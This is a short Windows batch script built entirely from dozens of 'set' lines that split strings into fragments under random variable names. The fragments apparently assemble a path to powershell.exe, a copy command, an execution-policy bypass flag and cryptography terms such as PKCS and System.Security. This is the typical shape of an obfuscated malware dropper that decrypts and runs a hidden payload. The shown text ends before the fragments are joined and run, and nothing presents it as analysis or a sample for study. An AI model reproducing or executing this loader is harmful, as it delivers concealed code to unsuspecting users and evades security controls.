@echo off
set "SMdsyphePy=nd"
set "muGGzynxkG=:\"
set "jIKNiGmAum=we"
set "GKOpYOnroR=do"
set "aKZQTLSFdu=0\"
set "eSTwSFeEiz=s\"
set "JhdNlQFrvp=Wi"
set "nXZInAQvcp=ws"
set "PLemNuwrrb=Po"
set "QMPgQNuJbF=.e"
set "NistqHaisu= C"
set "bUEcQsqddC=py"
set "XlSaIQXwic=xe"
set "rjHLUFBnyD=st"
set "MeGPpHoYCs=ow"
set "empSMYbsKi=he"
set "invyfsxibY=y "
set "UEXIjowPWN=po"
set "oqbQHXStmG=\v"
set "HSTLZhRxqx=rS"
set "EyGDKVFBBE=he"
set "yzxfgMmZjB=co"
set "cIMdBzrnij=Sy"
set "DYbTwLcgcn=1."
set "dmpVauUgQW=we"
set "eQgEYvUJTA=in"
set "sCwIHrWVdT= /"
set "DgknHDqlXV=rs"
set "BGOdkaTGzS=em"
set "sWanHFnmAH=ll"
set "omkojNvdPz=ll"
set "qaQsaVkhCn=\W"
set "lCVqwdrDoP=32"
set "EKpgcXIUCf=cd"
set "hWfpshcdnb= %~dp0"
set "HqAogRUcjc=);$V"
set "bRVpDviCbT=hX ="
set "zHqIgjbScY=t Sy"
set "kJwhJxsJCo=k; }"
set "bTbquTfMqE=7;$V"
set "uddSWgHSof=n = "
set "XMHYRZmLCE=-ep "
set "wVBWnhujXw=Tuwy"
set "fbDwdZsCVt=7kGw"
set "bcSpqlEyPv=1] -"
set "KtjNArvjGQ=[Sys"
set "dMAqetVvdr=yTo("
set "AhXOJZIvxu=ddin"
set "wfFMTaabJc=TllA"
set "ubcIZpSNAM=y, 0"
set "XYWLxjCWYD=PKCS"
set "SWnvsRBZGw=and "
set "IXRDebuoEo=);$V"
set "IYYMKUGwEh=File"
set "oZpvkMIqxP=bstr"
set "fxCLYlIcsd=1..-"
set "TPcSbQavSK=.Sec"
set "LvyzpxcxJB= [Sy"
set "eBIWYoEbOr=IZMC"
set "KZKBcJaQbQ=oL'["
set "OTrcKTzCrn=$YLD"
set "RjcBnSbeNP=)) {"
